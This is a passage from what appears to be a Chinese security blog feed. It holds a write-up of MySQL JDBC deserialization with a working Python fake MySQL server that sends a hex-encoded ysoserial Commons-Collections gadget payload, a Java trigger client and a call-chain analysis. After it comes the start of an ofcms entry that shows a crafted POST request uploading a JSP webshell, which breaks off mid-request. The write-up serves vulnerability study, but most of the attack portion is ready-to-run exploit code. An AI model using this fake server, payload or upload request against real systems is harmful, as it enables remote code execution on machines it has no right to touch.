print(<span class="hljs-string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(data).lower()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_data</span>(<span class="hljs-params">conn,data</span>):</span><br>    print(<span class="hljs-string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br>    conn.send(binascii.a2b_hex(data))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_payload_content</span>():</span><br>    <span class="hljs-comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span><br>    file= <span class="hljs-string">r&#x27;payload&#x27;</span><br>    <span class="hljs-keyword">if</span> os.path.isfile(file):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            payload_content = <span class="hljs-built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        print(<span class="hljs-string">&quot;open successs&quot;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;open false&quot;</span>)<br>        <span class="hljs-comment">#calc</span><br>        payload_content=<span class="hljs-string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span><br>    <span class="hljs-keyword">return</span> payload_content<br><br><span class="hljs-comment"># 主要逻辑</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>():</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        conn, addr = sk.accept()<br>        print(<span class="hljs-string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(addr[<span class="hljs-number">0</span>],addr[<span class="hljs-number">1</span>]))<br><br>        <span class="hljs-comment"># 1.先发送第一个 问候报文</span><br>        send_data(conn,greeting_data)<br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span><br>            receive_data(conn)<br>            send_data(conn,response_ok_data)<br><br>            <span class="hljs-comment">#其他过程</span><br>            data=receive_data(conn)<br>            <span class="hljs-comment">#查询一些配置信息,其中会发送自己的 版本号</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;session.auto_increment_increment&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload=<span class="hljs-string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span><br>                send_data(conn,_payload)<br>                data=receive_data(conn)<br>            <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                _payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span><br>                send_data(conn, _payload)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set names&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;set character_set_results&quot;</span> <span class="hljs-keyword">in</span> data:<br>                send_data(conn, response_ok_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show session status&quot;</span> <span class="hljs-keyword">in</span> data:<br>                mysql_data = <span class="hljs-string">&#x27;0100000102&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                mysql_data += <span class="hljs-string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span><br>                <span class="hljs-comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span><br>                <span class="hljs-comment"># 获取payload</span><br>                payload_content=get_payload_content()<br>                <span class="hljs-comment"># 计算payload长度</span><br>                payload_length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">4</span>)<br>                payload_length_hex = payload_length[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + payload_length[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                <span class="hljs-comment"># 计算数据包长度</span><br>                data_len = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload_content)//<span class="hljs-number">2</span> + <span class="hljs-number">4</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">6</span>)<br>                data_len_hex = data_len[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>] + data_len[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] + data_len[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>                mysql_data += data_len_hex + <span class="hljs-string">&#x27;04&#x27;</span> + <span class="hljs-string">&#x27;fbfc&#x27;</span>+ payload_length_hex<br>                mysql_data += <span class="hljs-built_in">str</span>(payload_content)<br>                mysql_data += <span class="hljs-string">&#x27;07000005fe000022000100&#x27;</span><br>                send_data(conn, mysql_data)<br>                data = receive_data(conn)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;show warnings&quot;</span> <span class="hljs-keyword">in</span> data:<br>                payload = <span class="hljs-string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span><br>                send_data(conn, payload)<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    HOST =<span class="hljs-string">&#x27;0.0.0.0&#x27;</span><br>    PORT = <span class="hljs-number">3306</span><br><br>    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <span class="hljs-comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span><br>    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>    sk.bind((HOST, PORT))<br>    sk.listen(<span class="hljs-number">1</span>)<br><br>    print(<span class="hljs-string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(HOST,PORT))<br><br>    run()<br></code></pre></td></tr></table></figure><p>触发JDBC反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JdbcTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Class.forName(<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>);<br>        String jdbc_url = <span class="hljs-string">&quot;jdbc:mysql://127.0.0.1:3306/test?&quot;</span> +<br>                <span class="hljs-string">&quot;autoDeserialize=true&quot;</span> +<br>                <span class="hljs-string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;<br>        Connection con = DriverManager.getConnection(jdbc_url, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行成功</p><p><a href="https://imgtu.com/i/4tuyhq"><img src="https://z3.ax1x.com/2021/09/21/4tuyhq.png" alt="4tuyhq.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>分析ServerStatusDiffInterceptor</p><p>在调用com.mysql.cj.jdbc中相关函数来连接恶意MySQL服务器时，会调用到com.mysql.cj.jdbc.result.ResultSetImpl.getObject()函数，而其中会调用readObject()函数执行反序列化操作</p><p>先看反序列化点</p><p><code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code></p><ol><li>判断输入参数columnIndex是否大于1，如果是就向下执行</li><li>判断是不是二进制数据（isBinary），还有Mysql字段类型是否为BLOB（isBlob）</li><li>调用getBytes从Mysql服务端获取对应的字节码数据</li><li>判断输入JDBC链接URL的autoDeserialize是否为true，满足则进入反序列化操作</li><li>判断前两个字节是否为-84和-19，即AC和ED</li><li>满足条件后进入反序列化操作</li></ol><p><a href="https://imgtu.com/i/4tusNn"><img src="https://z3.ax1x.com/2021/09/21/4tusNn.png" alt="4tusNn.png"></a></p><p>getBytes读取Mysql恶意服务端上的字节码，用于反序列化</p><p><a href="https://imgtu.com/i/4tu4HJ"><img src="https://z3.ax1x.com/2021/09/21/4tu4HJ.png" alt="4tu4HJ.png"></a></p><p><code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code>是怎么被调用的？</p><ol><li>在<code>com.mysql.jdbc.Driver</code>中新建连接实例</li><li>设置对应的查询拦截器，也就是在JDBC连接url中设置的ServerStatusDiffInterceptor</li><li>从MySQL服务端初始化Properties并执行相关的sql语句，如果查询拦截器不为空则调用查询拦截器的preProcess函数</li><li>运行查询语句<code>SHOW SESSION STATUS</code>，然后调用<code>ResultSetUtil.resultSetToMap()</code>，其中调用了<code>getObject()</code>函数触发反序列化（注意columnIndex为2处才能走到反序列化的代码逻辑，因为为1则直接返回null）</li><li>进入getObject()，判断字段类型为BLOB</li></ol><p>1.</p><p><code>java.sql.DriverManager#getConnection</code></p><p>新建连接实例</p><p><a href="https://imgtu.com/i/4tuB7j"><img src="https://z3.ax1x.com/2021/09/21/4tuB7j.png" alt="4tuB7j.png"></a></p><p>2.</p><p><code>com.mysql.cj.jdbc.ConnectionImpl#connectOneTryOnly</code></p><p>调用<code>setQueryIntercptors</code>，设置拦截器（ServerStatusDiffInterceptor）</p><p><a href="https://imgtu.com/i/4tuc90"><img src="https://z3.ax1x.com/2021/09/21/4tuc90.png" alt="4tuc90.png"></a></p><p><code>com.mysql.cj.jdbc.ConnectionImpl#setAutoCommit</code></p><p>这里执行了一些诸如<code>set autocommit=1</code>之类的sql语句，进一步触发之前设置好的拦截器</p><p><a href="https://imgtu.com/i/4tuhB4"><img src="https://z3.ax1x.com/2021/09/21/4tuhB4.png" alt="4tuhB4.png"></a></p><p>3.</p><p><code>com.mysql.cj.protocol.a.NativeProtocol#sendQueryPacket</code></p><p>这里调用了拦截器（ServerStatusDiffContext）的preProcess方法</p><p><a href="https://imgtu.com/i/4tufuF"><img src="https://z3.ax1x.com/2021/09/21/4tufuF.png" alt="4tufuF.png"></a></p><p>4.</p><p><code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#preProcess</code></p><p>调用populateMapWithSessionStatusValues</p><p><a href="https://imgtu.com/i/4tuRjU"><img src="https://z3.ax1x.com/2021/09/21/4tuRjU.png" alt="4tuRjU.png"></a></p><p>5.</p><p><code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffIntercept#populateMapWithSessionStatusValues</code></p><p>这里执行了sql语句<code>SHOW SESSION STATUS</code></p><p>然后调用ResultSetUtil.resultSetToMap()</p><p><a href="https://imgtu.com/i/4tug3V"><img src="https://z3.ax1x.com/2021/09/21/4tug3V.png" alt="4tug3V.png"></a></p><p>6.</p><p><code>com.mysql.cj.jdbc.util.ResultSetUtil.resultSetToMap</code></p><p>调用<code>com.mysql.cj.jdbc.result.ResultSetImpl#getObject()</code>，触发反序列化</p><p><a href="https://imgtu.com/i/4tu2cT"><img src="https://z3.ax1x.com/2021/09/21/4tu2cT.png" alt="4tu2cT.png"></a></p><p>调用栈</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">getObject</span><span class="hljs-selector-pseudo">:1326</span>, <span class="hljs-selector-tag">ResultSetImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span><span class="hljs-selector-class">.result</span>)<br><span class="hljs-selector-tag">resultSetToMap</span><span class="hljs-selector-pseudo">:46</span>, <span class="hljs-selector-tag">ResultSetUtil</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span><span class="hljs-selector-class">.util</span>)<br><span class="hljs-selector-tag">populateMapWithSessionStatusValues</span><span class="hljs-selector-pseudo">:87</span>, <span class="hljs-selector-tag">ServerStatusDiffInterceptor</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span><span class="hljs-selector-class">.interceptors</span>)<br><span class="hljs-selector-tag">preProcess</span><span class="hljs-selector-pseudo">:105</span>, <span class="hljs-selector-tag">ServerStatusDiffInterceptor</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span><span class="hljs-selector-class">.interceptors</span>)<br><span class="hljs-selector-tag">preProcess</span><span class="hljs-selector-pseudo">:76</span>, <span class="hljs-selector-tag">NoSubInterceptorWrapper</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>)<br><span class="hljs-selector-tag">invokeQueryInterceptorsPre</span><span class="hljs-selector-pseudo">:1137</span>, <span class="hljs-selector-tag">NativeProtocol</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.a</span>)<br><span class="hljs-selector-tag">sendQueryPacket</span><span class="hljs-selector-pseudo">:963</span>, <span class="hljs-selector-tag">NativeProtocol</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.a</span>)<br><span class="hljs-selector-tag">sendQueryString</span><span class="hljs-selector-pseudo">:914</span>, <span class="hljs-selector-tag">NativeProtocol</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.a</span>)<br><span class="hljs-selector-tag">execSQL</span><span class="hljs-selector-pseudo">:1150</span>, <span class="hljs-selector-tag">NativeSession</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span>)<br><span class="hljs-selector-tag">setAutoCommit</span><span class="hljs-selector-pseudo">:2064</span>, <span class="hljs-selector-tag">ConnectionImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br><span class="hljs-selector-tag">handleAutoCommitDefaults</span><span class="hljs-selector-pseudo">:1382</span>, <span class="hljs-selector-tag">ConnectionImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br><span class="hljs-selector-tag">initializePropsFromServer</span><span class="hljs-selector-pseudo">:1327</span>, <span class="hljs-selector-tag">ConnectionImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br><span class="hljs-selector-tag">connectOneTryOnly</span><span class="hljs-selector-pseudo">:966</span>, <span class="hljs-selector-tag">ConnectionImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br><span class="hljs-selector-tag">createNewIO</span><span class="hljs-selector-pseudo">:825</span>, <span class="hljs-selector-tag">ConnectionImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br>&lt;<span class="hljs-selector-tag">init</span>&gt;<span class="hljs-selector-pseudo">:455</span>, <span class="hljs-selector-tag">ConnectionImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br><span class="hljs-selector-tag">getInstance</span><span class="hljs-selector-pseudo">:240</span>, <span class="hljs-selector-tag">ConnectionImpl</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br><span class="hljs-selector-tag">connect</span><span class="hljs-selector-pseudo">:207</span>, <span class="hljs-selector-tag">NonRegisteringDriver</span> (<span class="hljs-selector-tag">com</span><span class="hljs-selector-class">.mysql</span><span class="hljs-selector-class">.cj</span><span class="hljs-selector-class">.jdbc</span>)<br><span class="hljs-selector-tag">getConnection</span><span class="hljs-selector-pseudo">:664</span>, <span class="hljs-selector-tag">DriverManager</span> (<span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.sql</span>)<br><span class="hljs-selector-tag">getConnection</span><span class="hljs-selector-pseudo">:247</span>, <span class="hljs-selector-tag">DriverManager</span> (<span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.sql</span>)<br><span class="hljs-selector-tag">main</span><span class="hljs-selector-pseudo">:10</span>, <span class="hljs-selector-tag">Test</span><br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>利用前提：JDBC链接可控</p><p>JDBC初始化过程中会执行某些sql语句（SHOW SESSION STATUS），进而触发拦截器（ServerStatusDiffInterceptor）的preProcess方法，最后调用<code>getObject触发反序列化</code></p><ol><li><code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#preProcess</code></li><li><code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffIntercept#populateMapWithSessionStatusValues</code></li><li><code>com.mysql.cj.jdbc.util.ResultSetUtil#resultSetToMap</code></li><li><code>com.mysql.cj.jdbc.result.ResultSetImpl#getObject()</code></li></ol><p>终点：在<code>com.mysql.cj.jdbc.result.ResultSetImpl#getObject()</code>处读取Mysql恶意服务端上的设置好的序列化字节码，然后执行readObject触发反序列化</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p><a href="https://daybr4ak.github.io/2020/07/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://daybr4ak.github.io/2020/07/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p><a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://redteaming.net/pages/b62a2f/">https://redteaming.net/pages/b62a2f/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ofcms漏洞分析</title>
    <link href="/2021/09/01/ofcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/09/01/ofcms%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登录后台</p><p><a href="https://imgtu.com/i/hBrkp8"><img src="https://z3.ax1x.com/2021/09/01/hBrkp8.png" alt="hBrkp8.png"></a></p><p>抓包并按如下方式修改POST数据包，file_content是jsp马的内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /ofcms_admin_war/admin/cms/template/save.json HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost:<span class="hljs-number">8080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/json, text/javascript, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">5153</span><br><span class="hljs-attribute">Origin</span>: http://localhost:<span class="hljs-number">8080</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost:<span class="hljs-number">8080</span>/ofcms_admin_war/admin/cms/template/getTemplates.html<br><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">3</span>EC<span class="hljs-number">1</span>F<span class="hljs-number">4130</span>CDBC<span class="hljs-number">342</span>A<span class="hljs-number">5</span>DAB<span class="hljs-number">0</span>F<span class="hljs-number">478</span>E<span class="hljs-number">405</span>AA; cookieconsent_status=dismiss; Phpstorm-<span class="hljs-number">8</span>e<span class="hljs-number">4</span>b<span class="hljs-number">56</span>ac=beb<span class="hljs-number">94186</span>-<span class="hljs-number">86</span>bf-<span class="hljs-number">4</span>a<span class="hljs-number">9</span>d-<span class="hljs-number">832</span>a-<span class="hljs-number">863045</span>cf<span class="hljs-number">4</span>b<span class="hljs-number">2</span>f; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span 